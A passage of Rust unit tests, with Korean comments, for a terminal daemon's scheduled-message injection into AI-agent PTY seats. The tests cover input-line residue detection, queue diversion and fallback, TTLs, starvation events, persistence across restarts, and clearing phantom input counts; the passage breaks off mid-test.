    /// ★(리뷰 RR1-F1-XSOCK · RV1-CS-F1-CLAIMED · ③) **좌석 밖** 발신자의 Return 누락 잔여 — 교차 소켓 CEO·부서장(자기신고
    /// from · Claimed)과 데몬 command 잡 push_line(from 없음) — 위에서도 스케줄 직접 push 는 큐로 우회하지 않는다(pre-H 병합
    /// 제출이 유일한 자가치유). 잔여는 실제 핸들러(`dispatch` · peer pid 결측)로 만든다. 음성 대조: GUI 모양 삽입(human +
    /// machine_origin + 오너 토큰) 잔여는 종전대로 우회. RED(HEAD f1b1a7e8): Claimed·익명 모두 queued(gate:draft).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_cross_socket_residue_stays_direct() {
        let pack = crate::governance::HOutsidePack::new(); // 좌석보다 먼저(락 대기 중 좌석 만료 방지)
        let (d, s) = rig("h2-xsock");
        let tok = d.operator_token.clone().expect("데몬 토큰");
        let j = periodic("heartbeat-5m", 5);
        let leave = |body: &str, extra: serde_json::Value| {
            s.clear_pending_input();
            *s.last_human_input.lock().unwrap() = None;
            h_paint(&s, crate::governance::H_IDLE_SCREEN);
            crate::governance::h_send_outside(&pack, &d, s.id, body, extra);
            std::thread::sleep(std::time::Duration::from_millis(200));
            *s.last_human_input.lock().unwrap() = None;
            h_paint(&s, &crate::governance::h_residue_screen(body));
        };
        for (label, extra) in [("claimed", json!({"from": 900})), ("unattributed", json!({}))] {
            leave(&format!("XSOCK-{label} residue"), extra);
            assert_eq!(
                deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None),
                Ok("pushed"),
                "{label}: 좌석 밖 발신자의 잔여 위에서 큐로 우회했다 — input_pending 무기한(③ 자가치유 전멸)"
            );
            assert!(queue(&s).is_empty(), "{label}: 우회 항목이 남았다");
            // 앞 주입의 붙여넣기 창(본문 → 500ms → CR)과 렌더 settle 이 지나도록 기다린다.
            std::thread::sleep(std::time::Duration::from_millis(1600));
        }
        assert_eq!(h_ledger_count(&d, "schedule"), 2, "직접 주입 원장 2");
        // 음성 대조 — GUI 모양 삽입(오너 클릭)은 사람 의도 = 종전대로 우회.
        leave("GUI insert", json!({"human": true, "machine_origin": true, "owner_token": tok}));
        assert_eq!(
            deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None),
            Ok("queued(gate:draft)"),
            "GUI 삽입을 기계 잔여로 봤다"
        );
        assert_eq!(h_ledger_count(&d, "schedule"), 2);
        done(&s);
    }

    fn events(d: &Arc<Daemon>, name: &str) -> Vec<serde_json::Value> {
        d.bus.tail(5000).into_iter().filter(|e| e["name"] == name).collect()
    }

    /// ★(R3SH-1 · S1 모양) 기계가 본문과 **CR 까지** 보냈는데 TUI 가 그 Return 을 먹어 입력줄에 잔여가 남았다 — CR 이
    /// 계수·세대를 되돌려 owner 각인이 결측이 된 상태다. 그래도 H2 는 큐로 우회하지 않고 종전(pre-H)처럼 직접 주입해 잔여를
    /// 병합 제출한다(마지막 기계 본문의 꼬리로 입력줄이 완전히 설명됨 ∧ 그 뒤 사람 입력 없음 ∧ 사람 바이트 0).
    /// 음성 대조: 같은 잔여 뒤에 사람이 한 글자라도 치면(입력 시각이 기록보다 뒤) 종전대로 우회.
    /// RED(HEAD 1b614e47): queued(gate:draft) — heartbeat·wakeup 무기한 정체(③).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_swallowed_return_residue_stays_direct() {
        let pack = crate::governance::HOutsidePack::new();
        let (d, s) = rig("h2-swallowed");
        let body = "WORKER-REPORT swallowed-return body";
        h_paint(&s, H_IDLE_SCREEN);
        crate::governance::h_send_outside(&pack, &d, s.id, body, json!({}));
        // 짝 Return(CR) — 데몬은 제출로 계상한다(계수 0 · 세대 +1 → owner 결측).
        let r = match crate::handlers::dispatch(
            &d,
            cys::Request { id: json!(2), method: "surface.send_key".into(),
                           params: json!({"surface_id": s.id, "key": "Return"}) },
            None,
        ) {
            crate::handlers::Reply::Single(v) => v,
            _ => panic!("single reply"),
        };
        assert_eq!(r["ok"], json!(true), "전제: Return 이 쓰여야 한다: {r}");
        std::thread::sleep(std::time::Duration::from_millis(300));
        assert_eq!(s.pending_input_bytes.load(Ordering::Relaxed), 0, "전제: CR 뒤 계수 0");
        assert!(s.pending_input_owner().is_none(), "전제: CR 뒤 owner 결측");
        // TUI 가 Enter 를 먹었다 — 입력줄에 본문이 그대로 남았다.
        *s.last_human_input.lock().unwrap() = None;
        h_paint(&s, &crate::governance::h_residue_screen(body));
        let j = periodic("hb-5m", 5);
        assert_eq!(
            deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None),
            Ok("pushed"),
            "CR 이 삼켜진 기계 잔여 위에서 큐로 우회했다 — 푸는 주체 없는 무기한 보류(③)"
        );
        assert!(queue(&s).is_empty(), "우회 항목이 남았다");
        assert!(
            events(&d, "machine_inject.machine_residue").iter().any(|e| e["payload"]["basis"] == "submitted_body"),
            "잔여 귀속이 드러나지 않았다"
        );
        std::thread::sleep(std::time::Duration::from_millis(1600));
        // 음성 대조 — 같은 잔여에 사람 손이 닿았다(입력 시각이 기계 기록보다 뒤).
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(60));
        h_paint(&s, &crate::governance::h_residue_screen(body));
        assert_eq!(
            deliver_push(&d, &periodic("hb-other", 5), s.id, "[heartbeat] 5분 보고", None),
            Ok("queued(gate:draft)"),
            "사람이 손댄 뒤의 입력줄을 기계 잔여로 봤다"
        );
        done(&s);
    }

    /// ★(R3SH-1 · S2 모양) 큐가 배달한 데몬 Inject 의 CR 이 삼켜졌다(데몬 자신의 붙여넣기 잔여 · owner 없음) — 붙여넣기 창
    /// (500ms)이 지난 뒤에도 H2 는 직접 주입한다. 음성 대조: 입력줄에 기계 본문 **앞에** 다른 글자가 섞였으면(꼬리 일치 아님) 우회.
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_swallowed_inject_residue_stays_direct() {
        let (d, s) = rig("h2-inject-residue");
        let body = "[RESUME] 이전 세션 복원 — TODO 를 읽고 이어서 진행";
        s.write_tx
            .send(crate::state::WriteReq::Inject { text: body.into(), cr_delay_ms: 50, clear_first: false, guard: None })
            .expect("writer");
        std::thread::sleep(std::time::Duration::from_millis(900));
        s.set_pending_input(0); // 큐 Inject 경로와 같다(제출로 계상).
        *s.last_human_input.lock().unwrap() = None;
        h_paint(&s, &crate::governance::h_residue_screen(body));
        assert_eq!(
            deliver_push(&d, &periodic("hb-inject", 5), s.id, "[heartbeat] 5분 보고", None),
            Ok("pushed"),
            "데몬 Inject 잔여 위에서 큐로 우회했다(③)"
        );
        std::thread::sleep(std::time::Duration::from_millis(1600));
        // 음성 대조 — 입력줄이 기계 본문으로 **완전히** 설명되지 않는다(앞에 다른 글자).
        s.write_tx
            .send(crate::state::WriteReq::Inject { text: body.into(), cr_delay_ms: 50, clear_first: false, guard: None })
            .expect("writer");
        std::thread::sleep(std::time::Duration::from_millis(900));
        s.set_pending_input(0);
        h_paint(&s, &crate::governance::h_residue_screen(&format!("오너 메모 {body}")));
        assert_eq!(
            deliver_push(&d, &periodic("hb-inject-2", 5), s.id, "[heartbeat] 5분 보고", None),
            Ok("queued(gate:draft)"),
            "기계 본문으로 설명되지 않는 입력줄을 잔여로 봤다"
        );
        done(&s);
    }

    /// ★(R3SH-1 유계 폴백) 입증하지 못한 **기계 모양** 초안(사람 바이트 0 · 출처 불명 — 예: 붙여넣기 자리표시 `[Pasted text #1]`
    /// 가 남은 composer)이 같은 입력 세대로 사람 입력 없이 이어지면, 같은 주기 잡은 두 회차까지만 우회하고 세 번째 회차에
    /// 종전(pre-H)처럼 직접 주입한다(`schedule.draft_fallback` 1회). 음성 대조: 사람 바이트가 있는 초안(오너가 친 글자)은
    /// 몇 회차가 지나도 폴백하지 않는다(R3SH-2 — 오너 결재 대기 · 가시화만).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_unproven_machine_draft_falls_back_after_bounded_diverts() {
        let (d, s) = rig("h2-fallback");
        h_paint(&s, &crate::governance::h_residue_screen("[Pasted text #1 +12 lines]"));
        *s.last_human_input.lock().unwrap() = None;
        let j = periodic("hb-fb", 1);
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 1", None), Ok("queued(gate:draft)"));
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 2", None), Ok("queued(dedup)"), "같은 잡 대기는 1회분");
        assert_eq!(
            deliver_push(&d, &j, s.id, "[heartbeat] 3", None),
            Ok("pushed"),
            "입증 못 한 기계 모양 초안 위에서 무기한 우회한다(③ — 유계 폴백 부재)"
        );
        assert_eq!(events(&d, "schedule.draft_fallback").len(), 1, "폴백 사실이 드러나지 않았다");
        std::thread::sleep(std::time::Duration::from_millis(1600));
        // 음성 대조 — 사람이 친 초안(사람 바이트 > 0).
        s.clear_pending_input();
        s.apply_pending_input("오너가 쓰다 둔 초안".as_bytes(), crate::governance::InputOrigin::Human);
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(120));
        h_paint(&s, H_DRAFT_SCREEN);
        let jh = periodic("hb-human", 1);
        for n in 0..5 {
            let r = deliver_push(&d, &jh, s.id, "[heartbeat] h", None);
            assert!(matches!(r, Ok("queued(gate:draft)") | Ok("queued(dedup)")), "#{n}: 오너 초안 위에 직접 주입했다: {r:?}");
        }
        done(&s);
    }

    /// ★(R1-F3) 같은 잡의 우회 항목은 좌석 큐에 **1건만** 선다 — 주기 경계 발화가 만료 패스보다 먼저 와도 공존하지 않는다.
    /// 주기 잡 30개 × 2회차 = 깊이 30(보호선 50 미만 · schedule.error 0). RED(HEAD): 2회차 20건 적재 후 10건 queue_full.
    #[test]
    fn h2_same_job_divert_is_one_pending_entry() {
        let (d, s) = rig("h2-dedup");
        h_paint(&s, cys::first_run_gates::fixtures::LIVE_PERMISSION_PROMPT);
        for round in 0..2 {
            for i in 0..30 {
                let r = deliver_push(&d, &periodic(&format!("hb-{i}"), 1), s.id, "[heartbeat] 모달", None);
                assert!(r.is_ok(), "회차 {round} 잡 {i}: {r:?}");
            }
        }
        let q = queue(&s);
        assert_eq!(q.len(), 30, "같은 잡의 우회 항목이 공존한다(대기 1회분 불변식 위반)");
        let mut froms: Vec<_> = q.iter().filter_map(|e| e.from.clone()).collect();
        froms.sort();
        froms.dedup();
        assert_eq!(froms.len(), 30);
        done(&s);
    }

    /// ★(R3SH-2 (c)) 초안 우회가 기아 임계(기본 600s) 이상 이어지면 `queue.starved` 를 보류 에피소드마다 1회 낸다 —
    /// 우회 항목은 TTL ≤ 주기로 만료·재적재되므로 틱의 머리 나이 경보가 영영 나지 않았다(오너 부재 중 무음 정지).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_long_draft_hold_is_visible_as_starved() {
        let (d, s) = rig("h2-starved");
        s.apply_pending_input("오너가 쓰다 둔 초안".as_bytes(), crate::governance::InputOrigin::Human);
        *s.last_human_input.lock().unwrap() = Some(std::time::Instant::now() - std::time::Duration::from_secs(900));
        h_paint(&s, H_DRAFT_SCREEN);
        let j = periodic("hb-starve", 5);
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 1", None), Ok("queued(gate:draft)"));
        assert!(events(&d, "queue.starved").is_empty(), "임계 전에 기아 경보가 났다");
        // 보류가 임계를 넘겼다(기록 시작 시각을 과거로).
        {
            let mut m = draft_diverts().lock().unwrap();
            let rec = m.get_mut(&(d.socket_path.clone(), s.id, "hb-starve".to_string())).expect("추적 기록");
            rec.since = std::time::Instant::now() - std::time::Duration::from_secs(700);
        }
        s.pending_queue.lock().unwrap().clear();
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 2", None), Ok("queued(gate:draft)"));
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 3", None), Ok("queued(dedup)"));
        let st = events(&d, "queue.starved");
        assert_eq!(st.len(), 1, "초안 우회 장기 보류가 기아로 드러나지 않았다(또는 중복): {st:?}");
        assert!(st[0]["payload"]["blocked_by"].as_str().unwrap_or("").contains("gate:draft"));
        done(&s);
    }

    /// ★(R3SH-5 ②) 틱의 pause 확인과 push 사이에 동결로 끝난 원샷은 파일에 되돌려진다(at+1 · 해제 뒤 재발화).
    #[test]
    fn frozen_oneshot_is_requeued_to_file() {
        let (d, s) = rig("h2-oneshot-requeue");
        let dir = std::env::temp_dir().join(format!("cys-oneshot-requeue-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let path = dir.join("schedule.json");
        std::fs::write(&path, r#"{"jobs": [{"id": "other", "every_minutes": 5, "action": "push", "to": "master", "text": "x"}]}"#)
            .unwrap();
        let wake = job(json!({"id": "wake-1", "at": 1_900_000_000i64, "action": "push", "to": "master", "text": "[wakeup] 다음"}));
        requeue_oneshot_after_frozen_at(&d, &path, &wake);
        let root: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let back = root["jobs"].as_array().unwrap().iter().find(|j| j["id"] == "wake-1").cloned().expect("되돌린 원샷");
        assert_eq!(back["at"], json!(1_900_000_001i64));
        assert!(root["jobs"].as_array().unwrap().iter().any(|j| j["id"] == "other"), "다른 잡을 잃었다");
        // 멱등 — 같은 id 가 있으면 다시 넣지 않는다.
        requeue_oneshot_after_frozen_at(&d, &path, &wake);
        let root: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["jobs"].as_array().unwrap().iter().filter(|j| j["id"] == "wake-1").count(), 1);
        // 주기 잡은 대상이 아니다.
        requeue_oneshot_after_frozen_at(&d, &path, &periodic("p", 5));
        assert!(!root["jobs"].as_array().unwrap().iter().any(|j| j["id"] == "p"));
        let _ = std::fs::remove_dir_all(&dir);
        done(&s);
    }

    /// [H2 잔여 핀] busy(작업 중) 좌석은 막지 않는다 — §8 안에서 막는 유일한 방법(큐 보류)이 ③ 위험을 만든다.
    #[test]
    fn h2_busy_seat_stays_direct() {
        let (d, s) = rig("h2-busy");
        h_paint(&s, "✻ Working… (esc to interrupt)\n────────────────────\n❯ ");
        assert_eq!(deliver_push(&d, &periodic("hb", 5), s.id, "[heartbeat] busy", None), Ok("pushed"));
        assert_eq!(h_ledger_count(&d, "schedule"), 1);
        done(&s);
    }

    /// [H2 검토 1] 우회 적재는 보호선 50(전체 깊이)까지만 — 51번째 우회는 Err(queue_full) → schedule.error.
    /// 그 상태에서도 CLI `send --queued`·`send-key Return --queued` 는 수락된다(CLI 몫 50칸 보존).
    /// RED(HEAD): 모달 우회가 100 까지 차지한다.
    #[test]
    fn h2_fallback_headroom_keeps_cli_room() {
        let _g = crate::governance::PACK_ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let (d, s) = rig("h2-headroom");
        h_paint(&s, cys::first_run_gates::fixtures::LIVE_PERMISSION_PROMPT);
        for i in 0..50 {
            let j = periodic(&format!("hb-{i}"), 5);
            assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 모달 우회", None), Ok("queued(modal)"), "#{i}");
        }
        assert_eq!(queue(&s).len(), 50);
        let err = deliver_push(&d, &periodic("hb-50", 5), s.id, "[heartbeat] 51", None)
            .expect_err("우회 적재가 보호선 50 을 넘었다(CLI --queued 몫 잠식)");
        assert!(err.contains("queue_full"), "{err}");
        assert_eq!(classify_fire_result(&Err(err)), JobResultKind::Error);
        let rpc = |method: &str, params: serde_json::Value| -> serde_json::Value {
            match crate::handlers::dispatch(&d, cys::Request { id: json!(1), method: method.into(), params }, None) {
                crate::handlers::Reply::Single(v) => v,
                _ => panic!("single reply"),
            }
        };
        let r = rpc("surface.send_text", json!({"surface_id": s.id, "text": "워커 보고", "queued": true}));
        assert_eq!(r["ok"], json!(true), "CLI send --queued 가 거절됐다: {r}");
        let r = rpc("surface.send_key", json!({"surface_id": s.id, "key": "Return", "queued": true}));
        assert_eq!(r["ok"], json!(true), "CLI send-key --queued 가 거절됐다: {r}");
        assert_eq!(queue(&s).len(), 52);
        // 노브 0(HEAD) — 종전 U8 P1 상한 100(무회귀 핀).
        {
            let _k = HKnobGuard::set(&[("CYS_MACHINE_INJECT_HOLD", "0")]);
            assert_eq!(deliver_push(&d, &periodic("hb-x", 5), s.id, "[heartbeat] HEAD", None), Ok("queued(modal)"));
        }
        done(&s);
    }

    /// [H2] 주기 잡 우회 항목 TTL = min(주기, 데몬 기본) · 원샷(at)은 Some(0)(만료 없음 · R3SH-5) · 일일(time)은 None(데몬 기본 6h). 만료분은 만료 큐로 가고
    /// 다음 회차는 새 항목으로 다시 적재된다(대기가 1회분으로 묶인다).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_periodic_ttl_le_period_oneshot_default() {
        let (d, s) = rig("h2-ttl");
        h_paint(&s, H_DRAFT_SCREEN);
        assert_eq!(deliver_push(&d, &periodic("p5", 5), s.id, "[heartbeat] 1회차", None), Ok("queued(gate:draft)"));
        assert_eq!(deliver_push(&d, &periodic("p999", 999), s.id, "[heartbeat] 긴 주기", None), Ok("queued(gate:draft)"));
        let at = job(json!({"id": "wake", "at": 1_900_000_000i64, "action": "push", "to": "master", "text": "x"}));
        assert_eq!(deliver_push(&d, &at, s.id, "[wakeup] 원샷", None), Ok("queued(gate:draft)"));
        let daily = job(json!({"id": "daily", "time": "09:00", "action": "push", "to": "master", "text": "x"}));
        assert_eq!(deliver_push(&d, &daily, s.id, "[schedule daily] 일일", None), Ok("queued(gate:draft)"));
        let q = queue(&s);
        let ttl: Vec<Option<u64>> = q.iter().map(|e| e.ttl_secs).collect();
        // ★(R3SH-5 ①) 원샷(at)은 만료 없음(0) — 발화 뒤 파일에서 지워져 다시 오지 않는 wake 가 6h 뒤 조용히 사라지지 않게.
        assert_eq!(ttl, vec![Some(300), Some(6 * 3600), Some(0), None], "주기 TTL ≤ 주기 · 원샷 = 만료 없음 · 일일 = 데몬 기본");
        // 1회차가 주기를 넘기면 만료 큐로 간다(활성 머리에 두지 않는다).
        s.pending_queue.lock().unwrap()[0].enqueued_at = now_epoch() - 301.0;
        crate::governance::queue_expiry_pass(&d);
        let q = queue(&s);
        assert_eq!(q.len(), 3, "주기를 넘긴 우회 항목이 활성 큐에 남았다");
        assert!(s.expired_queue.lock().unwrap().iter().any(|e| e.from.as_deref() == Some("schedule:p5")));
        // 다음 회차는 새 문안으로 새 항목.
        assert_eq!(deliver_push(&d, &periodic("p5", 5), s.id, "[heartbeat] 2회차", None), Ok("queued(gate:draft)"));
        assert_eq!(queue(&s).last().map(|e| e.text.clone()), Some("[heartbeat] 2회차".into()));
        done(&s);
    }

    /// [H2 ③ 재기동 뒤 처리] 우회 항목은 WAL 에 영속된다 — 데몬이 재기동하면 같은 역할 좌석으로 재홈되고
    /// TTL·발신 라벨·경로 태그가 그대로 살아 있다(유실 0 · 스키마 변경 0 · ttl_secs 는 WP-5 필드).
    #[test]
    #[cfg_attr(not(unix), ignore = "윈도우 기본 H 마스크는 draft 축을 끈다(hold_axes_default(true)) — 이 검체는 유닉스 기본(draft 축) 동작을 본다")]
    fn h2_diverted_item_survives_daemon_restart() {
        let (d, s) = rig("h2-restart");
        h_paint(&s, H_DRAFT_SCREEN);
        assert_eq!(deliver_push(&d, &periodic("hb-r", 5), s.id, "[heartbeat] 재기동 전", None), Ok("queued(gate:draft)"));
        assert!(d.queue_wal_durable(), "WAL 영속 실패");
        let id = queue(&s)[0].id.clone();
        done(&s);
        // 같은 소켓 경로로 새 데몬(재기동) — 복원분을 새 master 좌석으로 재홈.
        let d2 = Daemon::new(d.socket_path.clone());
        let m2 = d2
            .create_surface(None, Some("sleep 30".into()), None, Some("master".into()), 24, 80)
            .expect("새 master 좌석");
        d2.roles.lock().unwrap().insert("master".into(), m2.id);
        d2.surfaces.lock().unwrap().insert(m2.id, m2.clone());
        assert!(d2.rehome_restored_queue() >= 1, "복원분이 재홈되지 않았다");
        let q2 = queue(&m2);
        let e = q2.iter().find(|e| e.id == id).expect("재기동 뒤 우회 항목이 사라졌다");
        assert_eq!(e.ttl_secs, Some(300), "TTL 이 복원에서 사라졌다");
        assert_eq!(e.origin, "schedule");
        assert_eq!(e.from.as_deref(), Some("schedule:hb-r"));
        assert_eq!(e.text, "[heartbeat] 재기동 전");
        let _ = m2.child.lock().unwrap().kill();
    }

    /// [노브] CYS_MACHINE_INJECT_HOLD=0 · 목록에서 schedule 제외 → HEAD 동작(초안 위 직접 주입 · 모달 우회 TTL 없음).
    #[test]
    fn h2_knob_off_is_head_identical() {
        let (d, s) = rig("h2-knob");
        let j = periodic("hb", 5);
        for knob in ["0", "channel,ceo,supervisor,takeover"] {
            let _k = HKnobGuard::set(&[("CYS_MACHINE_INJECT_HOLD", knob)]);
            h_paint(&s, H_DRAFT_SCREEN);
            assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] HEAD", None), Ok("pushed"), "{knob}");
            settle();
            h_paint(&s, cys::first_run_gates::fixtures::LIVE_PERMISSION_PROMPT);
            assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] HEAD 모달", None), Ok("queued(modal)"), "{knob}");
            let last = queue(&s).last().cloned().expect("모달 우회 항목");
            assert_eq!(last.ttl_secs, None, "{knob}: HEAD 모달 우회는 TTL 을 싣지 않는다(데몬 기본 6h)");
            d.paused.store(true, Ordering::Relaxed);
            h_paint(&s, H_IDLE_SCREEN);
            assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] HEAD pause", None), Ok("pushed"), "{knob}: HEAD 는 pause 를 여기서 보지 않았다");
            d.paused.store(false, Ordering::Relaxed);
            settle();
        }
        done(&s);
    }
}

// ═══════════ ★(0.14.43 · C8) 스케줄 직접 push(inject_on) 인계 뒤 입력줄 계수 계상 ═══════════
//
// 계약: 직접 push 인계(`try_send`)에 성공하면 큐 배달 인계와 같은 규약으로 미제출 계수를 0 으로 계상한다(`input_gate` 안 · 세대 +1) —
// 유령 계수(v2 좌석의 단독 Esc 등)가 하트비트 push 뒤에도 남아 그 좌석의 큐 배달을 `input_pending` 으로 막던 것의 수리. 게이트(보류·전환)는 무변경.
#[cfg(test)]
mod c8_push_counts_submit_tests {
    use super::*;
    use crate::governance::{
        h_ledger_count, h_paint, queue_block_diag, queue_remedy, HKnobGuard, InputOrigin, PendingInputModel,
        BLOCKED_INPUT_PENDING, H_DRAFT_SCREEN, H_IDLE_SCREEN,
    };
    use serde_json::json;
    use std::sync::atomic::Ordering;

    /// 마커 좌석(master · claude) — H2 검체와 같은 장비. 틱 표식(`lone_key_exempt`)이 거짓이라 **v2 좌석**이다(유령 계수가 생긴다).
    fn rig(tag: &str) -> (Arc<Daemon>, Arc<crate::state::Surface>) {
        rig_cmd(tag, "sleep 30")
    }

    /// `rig` 의 명령 지정판 — 자식을 죽여 PTY EOF(→ writer 종료)를 보려는 검체는 `exec sleep` 로 셸이 자식을 남기지 않게 한다.
    fn rig_cmd(tag: &str, cmd: &str) -> (Arc<Daemon>, Arc<crate::state::Surface>) {
        crate::delivery::tests::isolate_state_dir_for_thread(tag);
        let daemon = super::tests::test_daemon();
        let s = daemon
            .create_surface(None, Some(cmd.into()), None, Some("master".into()), 24, 80)
            .expect("좌석");
        daemon.roles.lock().unwrap().insert("master".into(), s.id);
        daemon.surfaces.lock().unwrap().insert(s.id, s.clone());
        *s.agent_meta.lock().unwrap() = Some(("claude".into(), "/usr/local/bin/claude".into()));
        std::thread::sleep(std::time::Duration::from_millis(300));
        (daemon, s)
    }

    fn job(v: serde_json::Value) -> Job {
        serde_json::from_value(v).expect("잡")
    }

    fn periodic(id: &str, every: u64) -> Job {
        job(json!({"id": id, "every_minutes": every, "action": "push", "to": "master", "text": "x"}))
    }

    fn queue(s: &Arc<crate::state::Surface>) -> Vec<crate::state::QueueEntry> {
        s.pending_queue.lock().unwrap().iter().cloned().collect()
    }

    fn events(d: &Arc<Daemon>, name: &str) -> Vec<serde_json::Value> {
        d.bus.tail(5000).into_iter().filter(|e| e["name"] == name).collect()
    }

    fn blocked_reason(s: &Arc<crate::state::Surface>) -> String {
        s.queue_blocked.lock().unwrap().as_ref().map(|(w, _)| w.clone()).unwrap_or_default()
    }

    fn done(s: &Arc<crate::state::Surface>) {
        let _ = s.child.lock().unwrap().kill();
    }

    /// 직접 주입 뒤 writer(본문 → 500ms → CR)와 PTY 에코가 끝나기를 기다린다 — 다음 화면을 그리기 전에.
    fn settle() {
        std::thread::sleep(std::time::Duration::from_millis(900));
    }

    /// 이 좌석의 `(미제출 계수, 사람 몫 raw)` — 사람 몫은 진단의 `min(계수)` 접힘 **전** 원값이다(정규화까지 잰다).
    fn counts(s: &Arc<crate::state::Surface>) -> (u64, u64) {
        (s.pending_input_bytes.load(Ordering::Relaxed), s.pending_input.lock().unwrap().human)
    }

    /// v2 좌석의 유령 계수 — 사람의 단독 Esc 1회(글자는 없다)가 계수 1 · 사람 1 로 남는다(`CYS_PENDING_INPUT_MODEL=v2`·윈도우의 실측 모양).
    fn make_ghost(s: &Arc<crate::state::Surface>) {
        assert_eq!(s.pending_input_model(), PendingInputModel::V2, "전제: 틱 표식 없는 좌석 = v2");
        let n = s.apply_pending_input(b"\x1b", InputOrigin::Human);
        assert_eq!((n.count, n.human), (1, 1), "전제: v2 단독 Esc = 유령 계수 1(사람 1): {n:?}");
        assert_eq!(counts(s), (1, 1));
    }

    /// [C8 본체] v2 좌석의 유령 계수(1 · 사람 1)가 있는 유휴 좌석에 직접 push → 계수 0(사람 몫 0 · 세대 증가) · `schedule.push_cleared_pending`
    /// 정확히 1건 · 그 뒤 큐 틱이 `input_pending` 없이 배달한다(진단도 같은 사실을 읽는다).
    /// RED(수정 전): push 뒤에도 계수 1 · 이벤트 0 · 큐 틱이 `input_pending` 으로 계속 보류.
    #[test]
    fn c8_push_clears_ghost_count_then_queue_tick_delivers_without_input_pending() {
        let _g = crate::governance::PACK_ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let (d, s) = rig("c8-ghost");
        h_paint(&s, H_IDLE_SCREEN);
        make_ghost(&s);
        // 대조(수정 전과 같은 사실) — 유령 계수가 큐 배달을 막는다. 진단(읽기만)도 같은 사실을 말한다(처방 = 유령 계수).
        let diag = queue_block_diag(&d, &s);
        assert_eq!((diag.pending_input_bytes, diag.pending_input_human_bytes, diag.input_model), (1, 1, "v2"));
        assert_eq!(diag.draft_visible, Some(false), "전제: 화면은 빈 입력줄이다");
        assert_eq!(queue_remedy(BLOCKED_INPUT_PENDING, &diag).0, "phantom_count", "전제: 유령 계수 처방이 서는 모양");
        let entry = d.next_queue_entry("[보고] 큐 항목".into(), None, "test");
        s.pending_queue.lock().unwrap().push_back(entry);
        crate::governance::h_queue_tick(&d);
        assert_eq!(queue(&s).len(), 1, "전제: 유령 계수가 큐 배달을 막는다");
        assert_eq!(blocked_reason(&s), BLOCKED_INPUT_PENDING, "전제: 막힘 사유 = input_pending");
        // push — 게이트(H0)는 계수 단독을 관측 불능으로 보므로(화면은 빈 줄) 종전대로 직접 주입이다.
        let gen0 = s.input_gen.load(Ordering::Acquire);
        let j = periodic("hb-c8", 5);
        assert_eq!(deliver_push(&d, &j, s.id, "[heartbeat] 5분 보고", None), Ok("pushed"));
        assert_eq!(h_ledger_count(&d, "schedule"), 1, "직접 주입 원장");
        // 계상 — 큐 인계 지점과 같은 규약(미러 0 · 세대 +1) + 사람 몫도 0.
        assert_eq!(counts(&s), (0, 0), "push 뒤에도 유령 계수가 남았다(큐 배달이 계속 input_pending 으로 막힌다)");
        assert!(s.input_gen.load(Ordering::Acquire) > gen0, "세대(input_gen)가 오르지 않았다 — 큐 인계 지점의 규약");
        let evs = events(&d, "schedule.push_cleared_pending");
        assert_eq!(evs.len(), 1, "관측 이벤트는 정확히 1건: {evs:?}");
        let ev = &evs[0];
        assert_eq!(ev["category"], json!("schedule"));
        assert_eq!(ev["surface_id"], json!(s.id));
        assert_eq!(ev["payload"]["surface_ref"], json!(cys::surface_ref(s.id)));
        assert_eq!(ev["payload"]["prev_bytes"], json!(1));
        assert_eq!(ev["payload"]["prev_human_bytes"], json!(1));
        assert_eq!(ev["payload"]["job"], json!("hb-c8"));
        let name = ev["name"].as_str().expect("이름");
        assert!(!crate::alert_route::routable(name), "관측 이벤트가 라우팅 대상이다(CSO 좌석 입력으로 샌다)");
        assert!(!name.starts_with(crate::alert_route::ALERT_ENGINE_PREFIX), "alert. 접두 금지");
        assert_ne!(name, "queue.input_pending_reset", "다른 이름이어야 한다");
        // 다음 틱 — 직접 주입의 붙여넣기 → CR 과 에코가 끝난 뒤 유휴 화면에서 큐 틱이 입력줄 점유 없이 배달한다.
        settle();
        h_paint(&s, H_IDLE_SCREEN);
        let diag = queue_block_diag(&d, &s);
        assert_eq!((diag.pending_input_bytes, diag.pending_input_human_bytes), (0, 0), "진단이 여전히 유령 계수를 읽는다");
        crate::governance::h_queue_tick(&d);
        assert!(queue(&s).is_empty(), "push 뒤 큐 틱이 배달하지 못했다(blocked={:?})", blocked_reason(&s));
